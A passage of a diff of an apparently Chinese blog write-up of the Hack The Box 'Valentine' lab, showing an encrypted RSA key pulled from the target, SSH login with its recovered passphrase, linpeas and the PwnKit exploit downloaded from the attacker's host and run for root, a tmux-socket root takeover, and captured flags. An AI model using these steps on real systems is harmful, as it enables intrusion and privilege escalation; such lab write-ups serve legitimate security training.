+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget https://10.10.10.79/dev/hype_key --no-check-certificate
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后通过xxd 对十六进制进行转换：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ xxd -r -p hype_key 
 </span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----
 </span></span><span class="line"><span class="cl">Proc-Type: 4,ENCRYPTED
@@ -455,10 +736,25 @@
 </span></span><span class="line"><span class="cl">l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
 </span></span><span class="line"><span class="cl">RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
 </span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY----- 
-</span></span></code></pre></div><p>可以看到是一个RSA私钥，接下去用ssh进行连接</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到是一个RSA私钥，接下去用ssh进行连接</p>
 <h2 id="初始shell">初始shell</h2>
 <p>对hype_key进行转码，并通过ssh进行连接</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ xxd -r -p hype_key &gt; hype_key.rsa
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
@@ -467,14 +763,45 @@
 </span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ ssh -i hype_key.rsa hype@10.10.10.79
 </span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;hype_key.rsa&#39;</span>: 
-</span></span></code></pre></div><p>这里私钥有密码，想到了之前decode中获取的字符串：heartbleedbelievethehype</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里私钥有密码，想到了之前decode中获取的字符串：heartbleedbelievethehype</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ ssh -i hype_key.rsa hype@10.10.10.79
 </span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;hype_key.rsa&#39;</span>: 
 </span></span><span class="line"><span class="cl">sign_and_send_pubkey: no mutual signature supported
 </span></span><span class="line"><span class="cl">hype@10.10.10.79<span class="err">&#39;</span>s password: 
-</span></span></code></pre></div><p>这里有个报错，因为新版本的ssh不再支持一些弱加密算法，所以如果要用的话需要手动指定<code>-o PubkeyAcceptedKeyTypes=+ssh-rsa</code>。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里有个报错，因为新版本的ssh不再支持一些弱加密算法，所以如果要用的话需要手动指定<code>-o PubkeyAcceptedKeyTypes=+ssh-rsa</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ ssh -i hype_key.rsa hype@10.10.10.79 -o <span class="nv">PubkeyAcceptedKeyTypes</span><span class="o">=</span>+ssh-rsa
 </span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;hype_key.rsa&#39;</span>: 
 </span></span><span class="line"><span class="cl">Welcome to Ubuntu 12.04 LTS <span class="o">(</span>GNU/Linux 3.2.0-23-generic x86_64<span class="o">)</span>
@@ -488,14 +815,39 @@
 </span></span><span class="line"><span class="cl">hype@Valentine:~$ id
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>hype<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>hype<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>hype<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,124<span class="o">(</span>sambashare<span class="o">)</span>
 </span></span><span class="line"><span class="cl">hype@Valentine:~$ 
-</span></span></code></pre></div><p>这里也可以修改SSH配置文件，在文件末尾追加以下内容</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Host *
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里也可以修改SSH配置文件，在文件末尾追加以下内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Host *
 </span></span><span class="line"><span class="cl">    <span class="nv">PubkeyAcceptedKeyTypes</span><span class="o">=</span>+ssh-rsa
 </span></span><span class="line"><span class="cl">    <span class="nv">HostKeyAlgorithms</span><span class="o">=</span>+ssh-rsa
-</span></span></code></pre></div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429170722849.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429170722849.png, resource/012-Valentine.assets/image-20230429170722849.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429170722849.png 2x" sizes="auto" data-title="image-20230429170722849" data-alt="image-20230429170722849" width="2270" height="1036" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429170722849.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429170722849.png, resource/012-Valentine.assets/image-20230429170722849.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429170722849.png 2x" sizes="auto" data-title="image-20230429170722849" data-alt="image-20230429170722849" width="2270" height="1036" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h2 id="root-shell">root shell</h2>
 <p>上传linpeas.sh进行信息搜集，利用Python和wget进行上传</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># kali</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># kali</span>
 </span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/tools<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ python3 -m http.server <span class="m">80</span>
 </span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
@@ -505,31 +857,66 @@
 </span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ wget http://10.10.14.22/linpeas.sh
 </span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ chmod +x linpeas.sh
 </span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ ./linpeas.sh &gt; result.txt
-</span></span></code></pre></div><p>利用同样的方式，再把result.txt下载到本地</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用同样的方式，再把result.txt下载到本地</p>
 <h3 id="cve-2021-4034">CVE-2021-4034</h3>
 <p>查看result.txt，发现系统存在sudo CVE-2021-4034漏洞，可利用该漏洞提权。</p>
 <p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429172250485.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172250485.png, resource/012-Valentine.assets/image-20230429172250485.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172250485.png 2x" sizes="auto" data-title="image-20230429172250485" data-alt="image-20230429172250485" width="1242" height="200" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hype@Valentine:/tmp$ wget http://10.10.14.22/PwnKit
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hype@Valentine:/tmp$ wget http://10.10.14.22/PwnKit
 </span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ chmod +x PwnKit 
 </span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ ./PwnKit 
 </span></span><span class="line"><span class="cl">root@Valentine:/tmp# id  
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,124<span class="o">(</span>sambashare<span class="o">)</span>,1000<span class="o">(</span>hype<span class="o">)</span>
 </span></span><span class="line"><span class="cl">root@Valentine:/tmp# 
-</span></span></code></pre></div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429172533596.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172533596.png, resource/012-Valentine.assets/image-20230429172533596.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172533596.png 2x" sizes="auto" data-title="image-20230429172533596" data-alt="image-20230429172533596" width="2210" height="606" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@Valentine:/tmp# cat /root/root.txt 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429172533596.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172533596.png, resource/012-Valentine.assets/image-20230429172533596.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172533596.png 2x" sizes="auto" data-title="image-20230429172533596" data-alt="image-20230429172533596" width="2210" height="606" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@Valentine:/tmp# cat /root/root.txt 
 </span></span><span class="line"><span class="cl">adf6f323296f600cec9294d64c6c9bc1
 </span></span><span class="line"><span class="cl">root@Valentine:/tmp# cat /home/hype/user.txt 
 </span></span><span class="line"><span class="cl">0b946d1f7c12bb371585d67c10557dc8
-</span></span></code></pre></div><h3 id="tmux提权">tmux提权</h3>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="tmux提权">tmux提权</h3>
 <p>查看result.txt，发现tmux session</p>
 <p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429174112440.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174112440.png, resource/012-Valentine.assets/image-20230429174112440.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174112440.png 2x" sizes="auto" data-title="image-20230429174112440" data-alt="image-20230429174112440" width="1674" height="298" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>通过tmux进行提权，成功获取root权限：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hype@Valentine:/tmp$ tmux -S /.devs/dev_sess
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hype@Valentine:/tmp$ tmux -S /.devs/dev_sess
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">root@Valentine:/tmp# id
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
 </span></span><span class="line"><span class="cl">root@Valentine:/tmp# 
-</span></span></code></pre></div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429174244442.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174244442.png, resource/012-Valentine.assets/image-20230429174244442.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174244442.png 2x" sizes="auto" data-title="image-20230429174244442" data-alt="image-20230429174244442" width="1584" height="446" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429174244442.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174244442.png, resource/012-Valentine.assets/image-20230429174244442.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429174244442.png 2x" sizes="auto" data-title="image-20230429174244442" data-alt="image-20230429174244442" width="1584" height="446" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h2 id="end">END</h2></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
